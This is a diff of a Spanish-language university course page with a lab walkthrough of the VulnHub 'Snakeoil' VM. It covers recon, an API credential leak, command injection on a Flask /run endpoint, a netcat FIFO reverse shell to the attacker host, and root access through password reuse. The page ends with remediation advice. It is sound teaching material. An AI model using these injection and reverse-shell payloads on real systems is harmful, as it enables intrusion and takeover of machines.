@@ -158,9 +158,9 @@
       
       <!-- Metadatos de Asignatura -->
       <div class="identity-meta">
-        <span class="meta-item">> Asignatura: CNO IV - Seguridad Informática</span>
-        <span class="meta-item">> Institución: Universidad Politécnica de San Luis Potosí</span>
-        <span class="meta-item">> Periodo: Agosto - Diciembre 2026</span>
+        <span class="meta-item">> Asignatura: CNO IV - Seguridad Informática <!--[cite: 6] --></span>
+        <span class="meta-item">> Institución: Universidad Politécnica de San Luis Potosí <!--[cite: 6] --></span>
+        <span class="meta-item">> Periodo: Agosto - Diciembre 2026 <!--[cite: 6] --></span>
       </div>
     </div>
 
@@ -207,11 +207,11 @@
     <div class="row-content data-module">
       <h3 class="activity-title" style="color: var(--accent);">De la teoría a la práctica: Walkthrough en acción</h3>
       <p class="lede">
-        Demostración práctica de las técnicas y metodologías utilizadas para evaluar y vulnerar la máquina virtual <strong>"Snakeoil"</strong> en un entorno controlado.
+        Demostración práctica de las técnicas y metodologías utilizadas para evaluar y vulnerar la máquina virtual <strong>"Snakeoil"</strong> en un entorno controlado. <!--[cite: 6] -->
       </p>
       
       <p style="color: var(--text-muted); margin-top: 15px;">
-        El proceso abarca desde la recolección inicial de información hasta el compromiso total del sistema, logrando acceso administrativo (root) e ilustrando los riesgos asociados a las configuraciones vulnerables y la falta de sanitización de entradas en servicios web.
+        El proceso abarca desde la recolección inicial de información hasta el compromiso total del sistema, logrando acceso administrativo (root) e ilustrando los riesgos asociados a las configuraciones vulnerables y la falta de sanitización de entradas en servicios web. <!--[cite: 6] -->
       </p>
 
       <div class="spec-grid" style="margin-top: 25px;">
@@ -219,7 +219,7 @@
           <span class="spec-tag">OBJETIVO DE EVALUACIÓN</span>
           <p style="font-size: 0.9rem; color: var(--text);">
             Máquina Virtual "Snakeoil" (Debian 10)<br>
-            Descarga VulnHub: <a href="https://www.vulnhub.com/entry/digitalworldlocal-snakeoil,738/" target="_blank" rel="noopener" style="color: var(--accent); text-decoration: underline;">digitalworldlocal-snakeoil (v738)</a>
+            Descarga VulnHub: <a href="https://www.vulnhub.com/entry/digitalworldlocal-snakeoil,738/" target="_blank" rel="noopener" style="color: var(--accent); text-decoration: underline;">digitalworldlocal-snakeoil (v738)</a> <!--[cite: 6] -->
           </p>
         </div>
         <div class="spec-item">
@@ -227,7 +227,7 @@
           <p style="font-size: 0.9rem; color: var(--text); font-family: var(--font-mono);">
             • Máquina Atacante: Kali Linux (Modo Host-Only / Solo anfitrión)<br>
             • Máquina Víctima: Snakeoil VM (Debian 10)<br>
-            • Aislamiento: Red virtual privada sin acceso a infraestructuras externas
+            • Aislamiento: Red virtual privada sin acceso a infraestructuras externas <!--[cite: 6] -->
           </p>
         </div>
       </div>
@@ -243,7 +243,7 @@
     <div class="row-content data-module">
       <h3 class="activity-title" style="color: var(--accent); font-size: 1.15rem;">Walkthrough en Video: Procedimiento Paso a Paso</h3>
       <p style="color: var(--text-muted); margin-bottom: 20px;">
-        Demostración audiovisual completa del reconocimiento perimetral, interacción con el backend web y escalada interna en la máquina objetivo.
+        Demostración audiovisual completa del reconocimiento perimetral, interacción con el backend web y escalada interna en la máquina objetivo. <!--[cite: 6] -->
       </p>
 
       <!-- CONTENEDOR DE YOUTUBE -->
@@ -258,142 +258,353 @@
       </div>
 
       <p style="color: var(--text-muted); font-size: 0.85rem; margin-top: 15px; font-family: var(--font-mono);">
-        >_ Nota: El video detalla la ejecución en tiempo real de los comandos, la interpretación de códigos HTTP y la remediación defensiva.
+        >_ Nota: El video detalla la ejecución en tiempo real de los comandos, la interpretación de códigos HTTP y la remediación defensiva. <!--[cite: 6] -->
       </p>
     </div>
   </section>
 
-  <!-- [PHASES_03] FASES DE EJECUCIÓN TÉCNICA -->
+  <!-- [RECON_03] RECONOCIMIENTO Y ENUMERACIÓN -->
   <section class="row">
     <div class="row-label">
-      <span class="row-index">[PHASES_03]</span>
-      <h2>Walkthrough</h2>
+      <span class="row-index">[RECON_03]</span>
+      <h2>Reconocimiento</h2>
     </div>
     <div class="row-content data-module">
-      
-      <!-- Fase 1 -->
+      <h4 style="color: #fff; font-size: 1.1rem; margin-bottom: 12px;">3.1. Identificación de Hosts Activos y Topología <!-- --></h4>
+      <p style="color: var(--text-muted); margin-bottom: 15px;">
+        La máquina atacante Kali Linux se configuró con un adaptador dual (NAT para conectividad y Adaptador sólo anfitrión en la interfaz <code>eth1</code> con la IP <code>192.168.56.101</code>) <!-- -->. Mediante la herramienta <code>arp-scan</code> se emitieron sondas ARP en el segmento local para localizar la máquina vulnerable <!-- -->:
+      </p>
+
+      <div class="code-window">
+        <div class="code-header">
+          <div class="code-dots"><span class="dot close"></span><span class="dot minimize"></span><span class="dot maximize"></span></div>
+          <div class="code-title">terminal — arp-scan</div>
+        </div>
+        <div class="code-body">
+<pre><code><span class="prompt-user">kali@kali</span>:<span class="prompt-char">~#</span> sudo arp-scan -I eth1 --localnet <!-- -->
+Interface: eth1, type: EN10MB, MAC: 08:00:27:4c:da:f4, IPv4: 192.168.56.101 <!-- -->
+Starting arp-scan 1.10.0 with 256 hosts <!-- -->
+192.168.56.100   08:00:27:da:5c:6f   (Unknown) <!-- -->
+192.168.56.102   08:00:27:42:84:ed   (Unknown)  <span class="comment"><-- Host Objetivo Snakeoil</span> <!-- -->
+2 responded <!-- --></code></pre>
+        </div>
+      </div>
+
+      <div class="evidence-box">
+        <img src="Archivos/Proyecto1/arpscan_descubrimiento.png" alt="Descubrimiento de host con arp-scan">
+        <p class="evidence-caption">>_ Detección de la dirección IP 192.168.56.102 asignada a la máquina Snakeoil en la red sólo anfitrión <!--[cite: 7] -->.</p>
+      </div>
+
+      <h4 style="color: #fff; font-size: 1.1rem; margin: 30px 0 12px;">3.2. Escaneo Exhaustivo de Puertos y Servicios (Nmap) <!--[cite: 7] --></h4>
+      <p style="color: var(--text-muted); margin-bottom: 15px;">
+        Se ejecutó una inspección completa sobre los 65,535 puertos TCP empleando el comando <code>sudo nmap -p- -sV -sC 192.168.56.102</code> <!--[cite: 7] -->. El escaneo determinó los siguientes vectores expuestos <!--[cite: 7] -->:
+      </p>
+
+      <table class="custom-table">
+        <thead>
+          <tr>
+            <th>Puerto</th>
+            <th>Protocolo</th>
+            <th>Servicio</th>
+            <th>Versión / Banner Técnico</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td>22</td>
+            <td>TCP</td>
+            <td>SSH</td>
+            <td>OpenSSH 7.9p1 Debian 10+deb10u2 (Protocolo 2.0) <!--[cite: 7] --></td>
+          </tr>
+          <tr>
+            <td>80</td>
+            <td>TCP</td>
+            <td>HTTP</td>
+            <td>nginx 1.14.2 (Título: "Welcome to SNAKEOIL!") <!--[cite: 7] --></td>
+          </tr>
+          <tr>
+            <td>8080</td>
+            <td>TCP</td>
+            <td>HTTP</td>
+            <td>nginx 1.14.2 (Título: "Welcome to Good Tech Inc.'s Snake Oil Project") <!--[cite: 7] --></td>
+          </tr>
+        </tbody>
+      </table>
+
+      <div class="evidence-box" style="margin-top: 20px;">
+        <img src="Archivos/Proyecto1/nmap_escaneo.png" alt="Resultado de Nmap en Snakeoil">
+        <p class="evidence-caption">>_ Salida técnica de Nmap reportando los puertos 22, 80 y 8080 en estado abierto <!--[cite: 7] -->.</p>
+      </div>
+    </div>
+  </section>
+
+  <!-- [WEB_04] ENUMERACIÓN WEB Y VULNERABILIDADES -->
+  <section class="row">
+    <div class="row-label">
+      <span class="row-index">[WEB_04]</span>
+      <h2>Web & API</h2>
+    </div>
+    <div class="row-content data-module">
+      <h4 style="color: #fff; font-size: 1.1rem; margin-bottom: 12px;">4.1. Fuerza Bruta de Directorios y Endpoints (Gobuster) <!--[cite: 7] --></h4>
+      <p style="color: var(--text-muted); margin-bottom: 15px;">
+        La aplicación del puerto 8080 corresponde a un blog desarrollado bajo el microframework Flask con autenticación administrada por <code>flask-jwt-extended</code> <!--[cite: 7] -->. La enumeración con Gobuster descubrió las siguientes rutas de API <!--[cite: 7] -->:
+      </p>
+
+      <div class="evidence-box">
+        <img src="Archivos/Proyecto1/gobuster_endpoints.png" alt="Fuerza bruta con Gobuster">
+        <p class="evidence-caption">>_ Identificación de endpoints críticos: /create, /login, /registration, /run, /secret y /users <!--[cite: 7] -->.</p>
+      </div>
+
+      <h4 style="color: #fff; font-size: 1.1rem; margin: 30px 0 12px;">4.2. Fuga de Credenciales (/users) <!--[cite: 7] --></h4>
+      <p style="color: var(--text-muted); margin-bottom: 15px;">
+        Una solicitud <code>GET /users</code> no contaba con mecanismos de autenticación y devolvió una estructura JSON exponiendo la cuenta del usuario <code>patrick</code> junto con su hash criptográfico derivado con el algoritmo PBKDF2-HMAC-SHA256 <!--[cite: 7] -->:
+      </p>
+
+      <div class="code-window">
+        <div class="code-header">
+          <div class="code-dots"><span class="dot close"></span><span class="dot minimize"></span><span class="dot maximize"></span></div>
+          <div class="code-title">terminal — curl /users</div>
+        </div>
+        <div class="code-body">
+<pre><code><span class="prompt-user">kali@kali</span>:<span class="prompt-char">~#</span> curl -i http://192.168.56.102:8080/users <!--[cite: 7] -->
+HTTP/1.1 200 OK <!--[cite: 7] -->
+Content-Type: application/json <!--[cite: 7] -->
+
+{"users": [{"username": "patrick", "password": "$pbkdf2-sha256$29000$e0/J.V.rVSol5HxPqdW6Nw$FZJVgjNJIw99RIiojrT/gn9xRr9SI/RYn.CGf84r040"}]} <!--[cite: 7] --></code></pre>
+        </div>
+      </div>
+
+      <div class="evidence-box">
+        <img src="Archivos/Proyecto1/leak_users.png" alt="Fuga de información en endpoint /users">
+        <p class="evidence-caption">>_ Exposición de identificador de usuario y hash de contraseña sin restricción de acceso <!--[cite: 7] -->.</p>
+      </div>
+
+      <h4 style="color: #fff; font-size: 1.1rem; margin: 30px 0 12px;">4.3. Registro, Autenticación y Extracción del Secreto Interno <!--[cite: 7] --></h4>
+      <p style="color: var(--text-muted); margin-bottom: 15px;">
+        Aprovechando el endpoint desprotegido <code>/registration</code>, se registró un usuario arbitrario (<code>usuario1</code> / <code>prueba123</code>) <!--[cite: 7] -->. Al autenticarlo en <code>/login</code>, la aplicación emitió un <code>access_token</code> y un <code>refresh_token</code> firmados <!--[cite: 7] -->. Utilizando este Access Token en la cabecera <code>Cookie: access_token_cookie=...</code> se consumió el recurso restringido <code>/secret</code>, obteniendo la clave interna de ejecución <!--[cite: 7] -->:
+      </p>
+
+      <div class="code-window">
+        <div class="code-header">
+          <div class="code-dots"><span class="dot close"></span><span class="dot minimize"></span><span class="dot maximize"></span></div>
+          <div class="code-title">terminal — curl /secret</div>
+        </div>
+        <div class="code-body">
+<pre><code><span class="prompt-user">kali@kali</span>:<span class="prompt-char">~#</span> curl -X GET http://192.168.56.102:8080/secret -H "Cookie: access_token_cookie=[JWT_TOKEN]" <!--[cite: 7] -->
+{"ip-address": "", "secret_key": "commandexecutionissecret"} <!--[cite: 7] --></code></pre>
+        </div>
+      </div>
+
+      <div class="evidence-box">
+        <img src="Archivos/Proyecto1/secret_key.png" alt="Extracción de secret_key mediante JWT">
+        <p class="evidence-caption">>_ Obtención de la clave autorizada commandexecutionissecret para la API administrativa <!--[cite: 7] -->.</p>
+      </div>
+    </div>
+  </section>
+
+  <!-- [EXPLOIT_05] EXPLOTACIÓN: SSRF Y RCE -->
+  <section class="row">
+    <div class="row-label">
+      <span class="row-index">[EXPLOIT_05]</span>
+      <h2>Explotación</h2>
+    </div>
+    <div class="row-content data-module">
+      <h4 style="color: #fff; font-size: 1.1rem; margin-bottom: 12px;">5.1. Inyección de Comandos en el Endpoint /run (RCE) <!--[cite: 7] --></h4>
+      <p style="color: var(--text-muted); margin-bottom: 15px;">
+        El endpoint <code>/run</code> recibe una petición JSON con los parámetros <code>url</code> y <code>secret_key</code> <!--[cite: 7] -->. En el backend, el valor de <code>url</code> es concatenado directamente en una subrutina del sistema mediante <code>Popen</code> con la directiva <code>shell=True</code> <!--[cite: 7] -->. Inyectando el delimitador de instrucciones (<code>;</code>) junto con el comando <code>'id'</code>, el servidor procesó la petición ejecutando la instrucción a nivel de sistema operativo <!--[cite: 7] -->:
+      </p>
+
+      <div class="code-window">
+        <div class="code-header">
+          <div class="code-dots"><span class="dot close"></span><span class="dot minimize"></span><span class="dot maximize"></span></div>
+          <div class="code-title">terminal — curl RCE /run</div>
+        </div>
+        <div class="code-body">
+<pre><code><span class="prompt-user">kali@kali</span>:<span class="prompt-char">~#</span> curl -X POST http://192.168.56.102:8080/run \ <!--[cite: 7] -->
+  -H "Authorization: Bearer [JWT_TOKEN]" \ <!--[cite: 7] -->
+  -H "Content-Type: application/json" \ <!--[cite: 7] -->
+  -d '{"url":"127.0.0.1:80; id;", "secret_key":"commandexecutionissecret"}' <!--[cite: 7] --></code></pre>
+        </div>
+      </div>
+
+      <div class="evidence-box">
+        <img src="Archivos/Proyecto1/rce_id.png" alt="Confirmación de Remote Command Execution">
+        <p class="evidence-caption">>_ Verificación del RCE al ejecutarse comandos del sistema a través de la API <!--[cite: 7] -->.</p>
+      </div>
+
+      <h4 style="color: #fff; font-size: 1.1rem; margin: 30px 0 12px;">5.2. Evasión de Filtros y Extracción del Código Fuente <!--[cite: 7] --></h4>
+      <p style="color: var(--text-muted); margin-bottom: 15px;">
+        La aplicación implementaba una lista negra de comandos que bloqueaba cadenas directas como <code>bash</code>, <code>python</code> o <code>nc</code> <!--[cite: 7] -->. Para examinar la arquitectura de control, se eludió la restricción inyectando la lectura del archivo principal con la instrucción <code>-h;cat app.py;</code>, permitiendo volcar en la respuesta HTTP el código fuente completo del backend Flask <!--[cite: 7] -->:
+      </p>
+
+      <div class="evidence-box">
+        <img src="Archivos/Proyecto1/codigo_app.png" alt="Extracción del código fuente app.py">
+        <p class="evidence-caption">>_ Volcado completo del script de la aplicación web exponiendo variables de configuración <!--[cite: 7] -->.</p>
+      </div>
+
+      <h4 style="color: #fff; font-size: 1.1rem; margin: 30px 0 12px;">5.3. Shell Reversa y Acceso Inicial <!--[cite: 7] --></h4>
+      <p style="color: var(--text-muted); margin-bottom: 15px;">
+        Para evitar los filtros textuales sobre la terminal interactiva, se construyó un script externo en la máquina atacante conteniendo una tubería nombrada (<em>FIFO Pipe</em>) <!--[cite: 7] -->:
+      </p>
+
+      <div class="code-window">
+        <div class="code-header">
+          <div class="code-dots"><span class="dot close"></span><span class="dot minimize"></span><span class="dot maximize"></span></div>
+          <div class="code-title">terminal — shell.sh & netcat listener</div>
+        </div>
+        <div class="code-body">
+<pre><code><span class="comment"># Payload alojado en Kali Linux (192.168.56.101):</span>
+<span class="prompt-user">kali@kali</span>:<span class="prompt-char">~#</span> echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.56.101 4444 >/tmp/f" > shell.sh <!--[cite: 7] -->
+
+<span class="comment"># Listener Netcat en espera de conexión:</span>
+<span class="prompt-user">kali@kali</span>:<span class="prompt-char">~#</span> nc -lvnp 4444 <!--[cite: 7] -->
+listening on [any] 4444 ... <!--[cite: 7] -->
+connect to [192.168.56.101] from (UNKNOWN) [192.168.56.102] 41378 <!--[cite: 7] -->
+<span class="prompt-user">patrick@SNAKEOIL</span>:<span class="prompt-char">~/flask_blog$</span> <!--[cite: 7] --></code></pre>
+        </div>
+      </div>
+
+      <div class="evidence-box">
+        <img src="Archivos/Proyecto1/reverse_shell.png" alt="Acceso inicial mediante Reverse Shell">
+        <p class="evidence-caption">>_ Conexión reversa exitosa recibida en Netcat bajo el contexto de usuario patrick <!--[cite: 7] -->.</p>
+      </div>
+    </div>
+  </section>
+
+  <!-- [PRIVESC_06] ESCALADA DE PRIVILEGIOS -->
+  <section class="row">
+    <div class="row-label">
+      <span class="row-index">[PRIVESC_06]</span>
+      <h2>Escalada</h2>
+    </div>
+    <div class="row-content data-module">
+      <h4 style="color: #fff; font-size: 1.1rem; margin-bottom: 12px;">6.1. Estabilización de TTY y Auditoría de Permisos Sudo <!--[cite: 7] --></h4>
+      <p style="color: var(--text-muted); margin-bottom: 15px;">
+        La shell fue estabilizada ejecutando <code>python3 -c 'import pty; pty.spawn("/bin/bash")'</code> <!--[cite: 7] -->. Al auditar las autorizaciones de ejecución mediante <code>sudo -l</code>, se constató que la cuenta <code>patrick</code> poseía la directiva global <code>(ALL : ALL) ALL</code>, requiriendo únicamente validar su contraseña local de Linux <!--[cite: 7] -->.
+      </p>
+
+      <h4 style="color: #fff; font-size: 1.1rem; margin: 30px 0 12px;">6.2. Reutilización de Credenciales (CWE-522) y Compromiso Total <!--[cite: 7] --></h4>
+      <p style="color: var(--text-muted); margin-bottom: 15px;">
+        Al inspeccionar el bloque de configuración en el archivo <code>app.py</code> volcado previamente, se observó que la variable de firma de tokens <code>app.config['JWT_SECRET_KEY']</code> contenía la cadena <code>NOreasonableDOUBTthisPASSWORDiSGOOD</code> <!--[cite: 7] -->. Se comprobó que dicha clave secreta fue reutilizada indebidamente como contraseña del sistema operativo para el usuario <code>patrick</code> <!--[cite: 7] -->:
+      </p>
+
+      <div class="code-window">
+        <div class="code-header">
+          <div class="code-dots"><span class="dot close"></span><span class="dot minimize"></span><span class="dot maximize"></span></div>
+          <div class="code-title">terminal — sudo su & proof.txt</div>
+        </div>
+        <div class="code-body">
+<pre><code><span class="prompt-user">patrick@SNAKEOIL</span>:<span class="prompt-char">~/flask_blog$</span> sudo su <!--[cite: 7] -->
+[sudo] password for patrick: <span class="comment">NOreasonableDOUBTthisPASSWORDiSGOOD</span> <!--[cite: 7] -->
+<span class="prompt-user">root@SNAKEOIL</span>:<span class="prompt-char">/home/patrick/flask_blog#</span> id <!--[cite: 7] -->
+uid=0(root) gid=0(root) groups=0(root) <!--[cite: 7] -->
+<span class="prompt-user">root@SNAKEOIL</span>:<span class="prompt-char">/home/patrick/flask_blog#</span> cat /root/proof.txt <!--[cite: 7] -->
+Congratulations on obtaining a root shell on this machine! :-) <!--[cite: 7] --></code></pre>
+        </div>
+      </div>
+
+      <div class="evidence-box">
+        <img src="Archivos/Proyecto1/escalada_root.png" alt="Acceso administrativo root y bandera proof.txt">
+        <p class="evidence-caption">>_ Elevación de privilegios a root y lectura de la prueba de compromiso final (/root/proof.txt) <!--[cite: 7] -->.</p>
+      </div>
+    </div>
+  </section>
+
+  <!-- [HARDENING_07] CONTROLES DEFENSIVOS Y REMEDIACIÓN -->
+  <section class="row">
+    <div class="row-label">
+      <span class="row-index">[HARDENING_07]</span>
+      <h2>Defensa</h2>
+    </div>
+    <div class="row-content data-module">
+      <h4 style="color: #fff; font-size: 1.1rem; margin-bottom: 12px;">7. Recomendaciones de Seguridad y Mitigación <!--[cite: 7] --></h4>
+      <p style="color: var(--text-muted); margin-bottom: 20px;">
+        Para remediar la cadena de explotación evidenciada, se dictaminan los siguientes controles en la infraestructura <!--[cite: 7] -->:
+      </p>
+
       <div class="control-card-sub">
-        <div class="control-title">1. Reconocimiento y Enumeración</div>
-        <p style="font-size: 0.9rem; color: var(--text-muted); margin-bottom: 12px;">
-          Descubrimiento del segmento de red e identificación de puertos y versiones de servicios activos mediante herramientas de escaneo perimetral:
-        </p>
-        
-        <table class="custom-table">
-          <thead>
-            <tr>
-              <th>Puerto</th>
-              <th>Protocolo</th>
-              <th>Servicio</th>
-              <th>Versión Detectada / Estado</th>
-            </tr>
-          </thead>
-          <tbody>
-            <tr>
-              <td>22</td>
-              <td>TCP</td>
-              <td>SSH</td>
-              <td>OpenSSH 7.9p1 (Debian)</td>
-            </tr>
-            <tr>
-              <td>80</td>
-              <td>TCP</td>
-              <td>HTTP</td>
-              <td>Nginx Web Server</td>
-            </tr>
-            <tr>
-              <td>8080</td>
-              <td>TCP</td>
-              <td>HTTP-Alt</td>
-              <td>Nginx (Portal Good Tech Inc.'s Snake Oil Project)</td>
-            </tr>
-          </tbody>
-        </table>
-      </div>
-
-      <!-- Fase 2 -->
-      <div class="control-card-sub" style="margin-top: 25px;">
-        <div class="control-title">2. Análisis de Vulnerabilidades</div>
-        <p style="font-size: 0.9rem; color: var(--text-muted);">
-          Exploración de directorios mediante herramientas de fuerza bruta (Gobuster) que expuso los endpoints <code>/users</code> (revelando nombres de usuario y hashes PBKDF2) y el endpoint administrativo <code>/run</code>, el cual presentó vectores de inyección de comandos en el backend al procesar parámetros HTTP POST no sanitizados.
+        <div class="control-title">1. Protección Estricta de Endpoints y Datos Sensibles (CWE-200) <!--[cite: 7] --></div>
+        <p style="font-size: 0.85rem; color: var(--text-muted);">
+          Restringir de forma mandatoria el acceso al endpoint <code>/users</code> decorándolo con directivas explícitas de autorización (ej. <code>@jwt_required()</code>) y abstenerse de enviar hashes criptográficos de contraseñas dentro de respuestas JSON <!--[cite: 7] -->.
         </p>
       </div>
 
-      <!-- Fase 3 -->
-      <div class="control-card-sub" style="margin-top: 25px;">
-        <div class="control-title">3. Explotación y Acceso Inicial</div>
-        <p style="font-size: 0.9rem; color: var(--text-muted);">
-          Construcción del vector de inyección de comandos mediante peticiones POST dirigidas hacia el servicio web, logrando la ejecución arbitraria de comandos en el sistema operativo y el posterior establecimiento de una reverse shell interactiva hacia el equipo atacante.
+      <div class="control-card-sub">
+        <div class="control-title">2. Prevención de Inyección de Comandos y SSRF (CWE-78 / CWE-918) <!--[cite: 7] --></div>
+        <p style="font-size: 0.85rem; color: var(--text-muted);">
+          Eliminar la concatenación directa de parámetros hacia funciones de sistema con intérprete habilitado (<code>Popen(..., shell=True)</code>) <!--[cite: 7] -->. Los argumentos deben pasarse como listas estructuradas y validarse rigurosamente mediante listas blancas (allowlists) de dominios e IPs permitidas <!--[cite: 7] -->.
         </p>
       </div>
 
-      <!-- Fase 4 -->
-      <div class="control-card-sub" style="margin-top: 25px;">
-        <div class="control-title">4. Post-Explotación y Escalada de Privilegios</div>
-        <p style="font-size: 0.9rem; color: var(--text-muted);">
-          Inspección interna de la máquina virtual (Debian 10) orientada a detectar configuraciones deficientes, permisos inapropiados o debilidades de elevación local para alcanzar el nivel de superusuario (<code>root</code>) y validar el compromiso total del sistema.
+      <div class="control-card-sub">
+        <div class="control-title">3. Gestión de Secretos y Políticas de No Reutilización (CWE-522 / CWE-798) <!--[cite: 7] --></div>
+        <p style="font-size: 0.85rem; color: var(--text-muted);">
+          Los secretos criptográficos de firma JWT jamás deben residir en texto plano en el repositorio del código fuente ni ser reutilizados como credenciales de acceso de cuentas locales del sistema operativo <!--[cite: 7] -->.
         </p>
       </div>
-
-      <!-- Imagen de la máquina -->
-      <div class="evidence-box" style="margin-top: 30px;">
-        <img src="Archivos/login_snakeoil.png" alt="Pantalla de inicio de sesión de Snakeoil en Debian 10">
-        <p class="evidence-caption">
-          >_ Interfaz de autenticación de la máquina virtual Snakeoil (Debian 10) en VirtualBox.
-        </p>
-      </div>
-
     </div>
   </section>
 
-  <!-- [CONC_04] FUNDAMENTOS TEÓRICOS Y CONCLUSIÓN -->
+  <!-- [REF_08] REFERENCIAS BIBLIOGRÁFICAS -->
   <section class="row">
     <div class="row-label">
-      <span class="row-index">[CONC_04]</span>
-      <h2>Conclusión</h2>
+      <span class="row-index">[REF_08]</span>
+      <h2>Referencias</h2>
     </div>
     <div class="row-content data-module">
-      <p style="color: var(--text-muted); line-height: 1.7; margin-bottom: 15px;">
-        El desarrollo de este walkthrough evidenció que la explotación de entornos reales demanda una metodología técnica sistemática y flexible. Cuando el análisis criptoanalítico sobre hashes complejos consume tiempo o capacidad de procesamiento inviable, el analista debe pivotar hacia fallos de validación en la lógica de negocio y en las interfaces de comunicación.
-      </p>
-      <p style="color: var(--text-muted); line-height: 1.7;">
-        Las brechas identificadas en la máquina Snakeoil ratifican que la robustez de un sistema no depende únicamente del uso de algoritmos criptográficos modernos, sino de la sanitización exhaustiva de cada parámetro de entrada, el principio de menor privilegio en los servicios expuestos y la actualización periódica de la infraestructura corporativa.
-      </p>
+      <ul class="tag-list" style="gap: 14px;">
+        <li style="font-size: 0.85rem; color: var(--text-muted); line-height: 1.6;">
+          > Digitalworld.local. (2021, 16 de agosto). <em>Snake Oil: 1</em>. VulnHub. https://www.vulnhub.com/entry/digitalworldlocal-snakeoil,738/ <!--[cite: 7] -->
+        </li>
+        <li style="font-size: 0.85rem; color: var(--text-muted); line-height: 1.6;">
+          > Flask-JWT-Extended. (s. f.). <em>Configuration options - Flask-JWT-Extended documentation</em>. Read the Docs. https://flask-jwt-extended.readthedocs.io/ <!--[cite: 7] -->
+        </li>
+        <li style="font-size: 0.85rem; color: var(--text-muted); line-height: 1.6;">
+          > Jones, M., Bradley, J., & Sakimura, N. (2015). <em>JSON Web Token (JWT) (RFC 7519)</em>. Internet Engineering Task Force (IETF). https://doi.org/10.17487/RFC7519 <!--[cite: 7] -->
+        </li>
+        <li style="font-size: 0.85rem; color: var(--text-muted); line-height: 1.6;">
+          > Lyon, G. F. (s. f.). <em>Nmap Network Scanning: The official Nmap project guide</em>. Nmap Project. https://nmap.org/book/ <!--[cite: 7] -->
+        </li>
+        <li style="font-size: 0.85rem; color: var(--text-muted); line-height: 1.6;">
+          > OWASP Foundation. (s. f.). <em>Testing for Server-Side Request Forgery (WSTG-INPV-19)</em>. OWASP Web Security Testing Guide. <!--[cite: 7] -->
+        </li>
+        <li style="font-size: 0.85rem; color: var(--text-muted); line-height: 1.6;">
+          > OWASP Foundation. (s. f.). <em>Command Injection</em>. OWASP Foundation Repository. <!--[cite: 7] -->
+        </li>
+        <li style="font-size: 0.85rem; color: var(--text-muted); line-height: 1.6;">
+          > OWASP Foundation. (2021). <em>A01:2021- Broken Access Control</em>. OWASP Top 10: 2021. https://owasp.org/Top10/A01_2021-Broken_Access_Control/ <!--[cite: 7] -->
+        </li>
+        <li style="font-size: 0.85rem; color: var(--text-muted); line-height: 1.6;">
+          > PTES Team. (2014). <em>The Penetration Testing Execution Standard (PTES)</em>. http://www.pentest-standard.org/ <!--[cite: 7] -->
+        </li>
+      </ul>
     </div>
   </section>
 
-  <!-- [DWN_05] RECURSOS DE DESCARGA -->
+  <!-- [DWN_09] RECURSOS DE DESCARGA -->
   <section class="row">
     <div class="row-label">
-      <span class="row-index">[DWN_05]</span>
+      <span class="row-index">[DWN_09]</span>
       <h2>Entregables</h2>
     </div>
     <div class="row-content">
-      
       <div class="downloads-grid">
         
-        <!-- Recurso 1: Informe en PDF -->
-        <a href="Archivos/Reporte_proyecto1.pdf" download class="download-card">
+        <!-- Recurso 1: Informe en PDF del Proyecto -->
+        <a href="Archivos/Proyecto1/Reporte_proyecto1.pdf" download class="download-card">
           <div class="dl-icon">[PDF]</div>
-          <span class="dl-title">Informe Técnico</span>
-          <span class="dl-meta">Reporte_proyecto1.pdf</span>
+          <span class="dl-title">Informe Técnico Completo</span>
+          <span class="dl-meta">Reporte_proyecto1.pdf <!--[cite: 7] --></span>
         </a>
 
-        <!-- Recurso 2: Objetivo VulnHub -->
+        <!-- Recurso 2: Máquina VulnHub -->
         <a href="https://www.vulnhub.com/entry/digitalworldlocal-snakeoil,738/" target="_blank" rel="noopener" class="download-card">
           <div class="dl-icon">[VM]</div>
           <span class="dl-title">Máquina Snakeoil</span>
-          <span class="dl-meta">Descarga OVA VulnHub</span>
-        </a>
-
-        <!-- Recurso 3: Script de Prueba -->
-        <a href="#" class="download-card">
-          <div class="dl-icon">[SH]</div>
-          <span class="dl-title">Comandos de Apoyo</span>
-          <span class="dl-meta">recon_commands.txt</span>
+          <span class="dl-meta">Descarga OVA VulnHub <!--[cite: 7] --></span>
         </a>
 
       </div>
-
     </div>
   </section>
   
@@ -402,7 +613,7 @@
 <footer class="site-footer">
   <div class="footer-inner">
     <p>© 2026 Alejandro García Morales. Todos los derechos reservados.</p>
-    <p>CNO IV — Seguridad Informática | UPSLP</p>
+    <p>CNO IV — Seguridad Informática | UPSLP <!--[cite: 7] --></p>
   </div>
 </footer>
 
